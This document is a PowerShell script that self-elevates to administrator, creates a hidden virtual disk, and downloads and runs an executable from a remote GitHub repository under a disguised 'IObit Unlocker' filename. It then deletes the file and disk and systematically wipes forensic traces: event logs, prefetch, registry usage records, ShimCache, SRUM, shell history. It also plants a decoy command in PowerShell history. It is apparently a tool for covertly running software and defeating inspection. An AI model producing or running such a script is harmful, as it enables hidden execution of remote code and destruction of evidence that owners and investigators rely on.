$ErrorActionPreference = 'SilentlyContinue'
cls

if (-not [Security.Principal.WindowsPrincipal]::new([Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    Start-Process PowerShell.exe -Verb RunAs -ArgumentList "-File `"$($MyInvocation.MyCommand.Path)`" $($MyInvocation.UnboundArguments -join ' ')"
    exit
}

Start-Service -Name "vds"

$vdiskSizeMB = 2048
$randomName = [System.IO.Path]::GetRandomFileName().Replace('.', '')
$vdiskPath = "H:\$randomName.vhd"

$createScript = @"
create vdisk file="$vdiskPath" maximum=$vdiskSizeMB type=expandable
select vdisk file="$vdiskPath"
attach vdisk
"@

$createScript | diskpart.exe 2>$null | Out-Null

Start-Sleep -Seconds 1

$disk = $null
for ($timeout = 0; $timeout -lt 8; $timeout++) {
    $disk = Get-Disk | Where-Object { $_.Location -like "*$vdiskPath*" } | Select-Object -First 1
    if ($disk) { break }
    Start-Sleep -Milliseconds 500
}

if ($disk) {
    if ($disk.IsOffline) {
        Set-Disk -Number $disk.Number -IsOffline $false -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 500
    }
    if ($disk.PartitionStyle -eq 'Raw') {
        Initialize-Disk -Number $disk.Number -PartitionStyle MBR -ErrorAction SilentlyContinue
        Start-Sleep -Milliseconds 500
    }
    New-Partition -DiskNumber $disk.Number -UseMaximumSize -DriveLetter Z -ErrorAction SilentlyContinue | Out-Null
    Start-Sleep -Milliseconds 500
    Format-Volume -DriveLetter Z -FileSystem FAT32 -NewFileSystemLabel "Local Disk" -Confirm:$false -ErrorAction SilentlyContinue
}

$driveReady = $false
for ($i = 0; $i -lt 6; $i++) {
    if (Test-Path "Z:\") {
        $driveReady = $true
        break
    }
    Start-Sleep -Milliseconds 500
}

if ($driveReady) {
    $exePath = "Z:\IO‎bit‎Un‎locker‎.exe"
    try {
        $webClient = New-Object System.Net.WebClient
        $webClient.DownloadFile("https://github.com/devnull-sys/files/raw/refs/heads/main/taskthow.exe", $exePath)
        
        $downloadComplete = $false
        $attempts = 0
        while (-not $downloadComplete -and $attempts -lt 30) {
            if (Test-Path $exePath) {
                try {
                    $fileStream = [System.IO.File]::Open($exePath, 'Open', 'Read', 'None')
                    $fileStream.Close()
                    $downloadComplete = $true
                } catch {
                    Start-Sleep -Milliseconds 500
                    $attempts++
                }
            } else {
                Start-Sleep -Milliseconds 500
                $attempts++
            }
        }
        
        Start-Sleep -Seconds 4
        
        if ((Test-Path $exePath) -and $downloadComplete) {
            Set-Clipboard -Value "SteF6b2WrAgu"
            
            $process = Start-Process -FilePath $exePath -PassThru
            
            if ($process -and $process.Id) {
                Start-Sleep -Seconds 3
                
                while (-not $process.HasExited) {
                    Start-Sleep -Seconds 1
                    $process.Refresh()
                }

                $replacementContent = $webClient.DownloadData("https://github.com/devnull-sys/files/raw/refs/heads/main/iwe_history.txt")
                [System.IO.File]::WriteAllBytes($exePath, $replacementContent)
                
                if (Test-Path $exePath) {
                    Remove-Item -Path $exePath -Force -ErrorAction SilentlyContinue
                }

                $detachScript = @"
select vdisk file="$vdiskPath"
detach vdisk noerr
exit
"@
                $detachScript | diskpart.exe 2>$null | Out-Null
                Start-Sleep -Seconds 1
                
                for ($i = 0; $i -lt 5; $i++) {
                    if (Test-Path $vdiskPath) {
                        Remove-Item -Path $vdiskPath -Force -ErrorAction SilentlyContinue
                        Start-Sleep -Milliseconds 200
                    } else {
                        break
                    }
                }
                
                $prefetchPath = "C:\Windows\Prefetch"
                Remove-Item -Path "$prefetchPath\POWERSHELL.EXE-*" -Force -ErrorAction SilentlyContinue
                Remove-Item -Path "$prefetchPath\VDS.EXE-*" -Force -ErrorAction SilentlyContinue
                Remove-Item -Path "$prefetchPath\IObit‎Un‎locker‎.exe-*" -Force -ErrorAction SilentlyContinue
                
                $historyPath = Join-Path $env:APPDATA "Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt"
                "iwr -useb https://raw.githubusercontent.com/spicetify/cli/main/install.ps1 | iex" | Set-Content $historyPath
                Start-Sleep -Milliseconds 100
                if (Test-Path $historyPath) {
                    Remove-Item -Path $historyPath -Force -ErrorAction SilentlyContinue
                }
                
                Clear-History
                
                $clrLogDirectories = @(
                    "$env:USERPROFILE\AppData\Local\Microsoft\CLR_v4.0\UsageLogs",
                    "$env:USERPROFILE\AppData\Local\Microsoft\CLR_v4.0_32\UsageLogs",
                    "C:\WINDOWS\system32\config\systemprofile\AppData\Local\Microsoft\CLR_v4.0\UsageLogs",
                    "C:\WINDOWS\SysWOW64\config\systemprofile\AppData\Local\Microsoft\CLR_v4.0_32\UsageLogs"
                )
                
                foreach ($clrDir in $clrLogDirectories) {
                    if (Test-Path $clrDir) {
                        try {
                            $clrFiles = Get-ChildItem -Path $clrDir -File -ErrorAction SilentlyContinue
                            foreach ($file in $clrFiles) {
                                Remove-Item -Path $file.FullName -Force -ErrorAction SilentlyContinue
                            }
                        } catch { }
                    }
                }
                
                $windowsHistoryPath = "$env:USERPROFILE\AppData\Local\Microsoft\Windows\History"
                if (Test-Path $windowsHistoryPath) {
                    try {
                        $historyFiles = Get-ChildItem -Path $windowsHistoryPath -Recurse -File -ErrorAction SilentlyContinue
                        foreach ($file in $historyFiles) {
                            Remove-Item -Path $file.FullName -Force -ErrorAction SilentlyContinue
                        }
                    } catch { }
                }
                
                $crashDumpsPath = "$env:USERPROFILE\AppData\Local\CrashDumps"
                if (Test-Path $crashDumpsPath) {
                    try {
                        $crashFiles = Get-ChildItem -Path $crashDumpsPath -File -ErrorAction SilentlyContinue
                        foreach ($file in $crashFiles) {
                            Remove-Item -Path $file.FullName -Force -ErrorAction SilentlyContinue
                        }
                    } catch { }
                }
                
                try {
                    $muiCachePath = "HKCU:\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\MuiCache"
                    if (Test-Path $muiCachePath) {
                        $muiCacheItems = Get-ItemProperty -Path $muiCachePath -ErrorAction SilentlyContinue
                        if ($muiCacheItems) {
                            $muiCacheItems.PSObject.Properties | ForEach-Object {
                                if ($_.Name -ne "LangID" -and $_.Name -ne "Default" -and $_.Name -notlike "PS*") {
                                    Remove-ItemProperty -Path $muiCachePath -Name $_.Name -ErrorAction SilentlyContinue
                                }
                            }
                        }
                    }
                    
                    $winrarArcNamePath = "HKCU:\SOFTWARE\WinRAR\DialogEditHistory\ArcName"
                    if (Test-Path $winrarArcNamePath) {
                        $arcNameItems = Get-ItemProperty -Path $winrarArcNamePath -ErrorAction SilentlyContinue
                        if ($arcNameItems) {
                            $arcNameItems.PSObject.Properties | ForEach-Object {
                                if ($_.Name -ne "Default" -and $_.Name -notlike "PS*") {
                                    Remove-ItemProperty -Path $winrarArcNamePath -Name $_.Name -ErrorAction SilentlyContinue
                                }
                            }
                        }
                    }
                    
                    $winrarArcHistoryPath = "HKCU:\SOFTWARE\WinRAR\ArcHistory"
                    if (Test-Path $winrarArcHistoryPath) {
                        $arcHistoryItems = Get-ItemProperty -Path $winrarArcHistoryPath -ErrorAction SilentlyContinue
                        if ($arcHistoryItems) {
                            $arcHistoryItems.PSObject.Properties | ForEach-Object {
                                if ($_.Name -ne "Default" -and $_.Name -notlike "PS*") {
                                    Remove-ItemProperty -Path $winrarArcHistoryPath -Name $_.Name -ErrorAction SilentlyContinue
                                }
                            }
                        }
                    }
                    
                    $showJumpViewPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\ShowJumpView"
                    if (Test-Path $showJumpViewPath) {
                        $showJumpViewItems = Get-ItemProperty -Path $showJumpViewPath -ErrorAction SilentlyContinue
                        if ($showJumpViewItems) {
                            $showJumpViewItems.PSObject.Properties | ForEach-Object {
                                if ($_.Name -ne "Default" -and $_.Name -notlike "PS*") {
                                    Remove-ItemProperty -Path $showJumpViewPath -Name $_.Name -ErrorAction SilentlyContinue
                                }
                            }
                        }
                    }
                    
                    $appLaunchPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppLaunch"
                    if (Test-Path $appLaunchPath) {
                        $appLaunchItems = Get-ItemProperty -Path $appLaunchPath -ErrorAction SilentlyContinue
                        if ($appLaunchItems) {
                            $appLaunchItems.PSObject.Properties | ForEach-Object {
                                if ($_.Name -ne "Default" -and $_.Name -notlike "PS*") {
                                    Remove-ItemProperty -Path $appLaunchPath -Name $_.Name -ErrorAction SilentlyContinue
                                }
                            }
                        }
                    }
                    
                    $appSwitchedPath = "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage\AppSwitched"
                    if (Test-Path $appSwitchedPath) {
                        $appSwitchedItems = Get-ItemProperty -Path $appSwitchedPath -ErrorAction SilentlyContinue
                        if ($appSwitchedItems) {
                            $appSwitchedItems.PSObject.Properties | ForEach-Object {
                                if ($_.Name -ne "Default" -and $_.Name -notlike "PS*") {
                                    Remove-ItemProperty -Path $appSwitchedPath -Name $_.Name -ErrorAction SilentlyContinue
                                }
                            }
                        }
                    }
                    
                    $volumeInfoCacheBasePath = "HKLM:\SOFTWARE\Microsoft\Windows Search\VolumeInfoCache"
                    @("Z:", "G:", "H:") | ForEach-Object {
                        $drivePath = "$volumeInfoCacheBasePath\$_"
                        if (Test-Path $drivePath) {
                            Remove-Item -Path $drivePath -Recurse -Force -ErrorAction SilentlyContinue
                        }
                    }
                    
                    $bamPath = "HKLM:\SYSTEM\CurrentControlSet\Services\bam\State\UserSettings\S-1-5-21-3210733953-3939104191-1814352177-1001"
                    if (Test-Path $bamPath) {
                        $bamItems = Get-ItemProperty -Path $bamPath -ErrorAction SilentlyContinue
                        if ($bamItems) {
                            $bamItems.PSObject.Properties | ForEach-Object {
                                if ($_.Name -ne "Default" -and $_.Name -notlike "PS*") {
                                    Remove-ItemProperty -Path $bamPath -Name $_.Name -ErrorAction SilentlyContinue
                                }
                            }
                        }
                    }
                } catch { }
                
                try {
                    $eventLogs = @("Security", "System", "Application", "Microsoft-Windows-Kernel-General/Operational")
                    foreach ($logName in $eventLogs) {
                        try {
                            $events = Get-WinEvent -FilterHashtable @{LogName=$logName; ID=1102,104,3079} -ErrorAction SilentlyContinue
                            if ($events) {
                                foreach ($event in $events) {
                                    try {
                                        Remove-WinEvent -FilterHashtable @{LogName=$logName; ID=$event.Id; TimeCreated=$event.TimeCreated} -ErrorAction SilentlyContinue
                                    } catch { }
                                }
                            }
                        } catch { }
                    }
                    
                    try {
                        $systemEvents = Get-WinEvent -FilterHashtable @{LogName="System"; ID=157,98,51,11,15,1006,1014} -ErrorAction SilentlyContinue
                        if ($systemEvents) {
                            foreach ($event in $systemEvents) {
                                try {
                                    Remove-WinEvent -FilterHashtable @{LogName="System"; ID=$event.Id; TimeCreated=$event.TimeCreated} -ErrorAction SilentlyContinue
                                } catch { }
                            }
                        }
                    } catch { }
                    
                    try {
                        $storageEvents = Get-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-StorageManagement/Operational"; ID=2005} -ErrorAction SilentlyContinue
                        if ($storageEvents) {
                            foreach ($event in $storageEvents) {
                                try {
                                    Remove-WinEvent -FilterHashtable @{LogName="Microsoft-Windows-StorageManagement/Operational"; ID=$event.Id; TimeCreated=$event.TimeCreated} -ErrorAction SilentlyContinue
                                } catch { }
                            }
                        }
                    } catch { }
                } catch { }
                
                try {
                    $mountedDevicesPath = "HKLM:\SYSTEM\MountedDevices"
                    if (Test-Path $mountedDevicesPath) {
                        $mountedDevices = Get-ItemProperty -Path $mountedDevicesPath -ErrorAction SilentlyContinue
                        if ($mountedDevices) {
                            $mountedDevices.PSObject.Properties | ForEach-Object {
                                if ($_.Name -notlike "PS*") {
                                    Remove-ItemProperty -Path $mountedDevicesPath -Name $_.Name -ErrorAction SilentlyContinue
                                }
                            }
                        }
                    }
                } catch { }
            } else {
                exit
            }
        }
    } catch { }
}

Stop-Service -Name "vds" -Force -ErrorAction SilentlyContinue

Write-Host "Clearing MuiCache"
reg delete "HKCR\Local Settings\Software\Microsoft\Windows\Shell" /f
Write-Host "Clearing ComDlg32"
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\ComDlg32" /f
Write-Host "Clearing RecentDocs"
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs" /f
Write-Host "Clearing UserAssist"
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist" /f
Write-Host "Clearing RunMRU"
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" /f
Write-Host "Clearing Compatibility Store"
reg delete "HKCU\Software\Microsoft\Windows NT\CurrentVersion\AppCompatFlags\Compatibility Assistant\Store" /f
Write-Host "Clearing AppSwitch"
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\FeatureUsage" /f

taskkill /f /im explorer.exe

net stop EventLog /y

Write-Host "Clearing pca"
Remove-Item "C:\Windows\appcompat\pca*.txt" -Force -Recurse
Write-Host "Clearing SRUM"
Remove-Item "C:\Windows\System32\sru\SRUDB.dat" -Force -Recurse
Write-Host "Clearing NvAppTimestamps"
Remove-Item "C:\ProgramData\NVIDIA Corporation\Drs\nvAppTimestamps" -Force -Recurse
Write-Host "Clearing Recent Files"
Remove-Item "$env:AppData\Microsoft\Windows\Recent*.lnk" -Force -Recurse
Remove-Item "$env:AppData\Microsoft\Windows\Recent\CustomDestinations*ms" -Force -Recurse
Remove-Item "$env:AppData\Microsoft\Windows\Recent\AutomaticDestinations*ms" -Force -Recurse
Write-Host "Clearing PSReadLine"
Remove-Item "$env:AppData\Microsoft\Windows\PowerShell\PSReadLine*.txt" -Force -Recurse

Write-Host "Clearing ShimCache"
Rundll32.exe apphelp.dll,ShimFlushCache

Start-Process explorer.exe
net start EventLog /y

exit
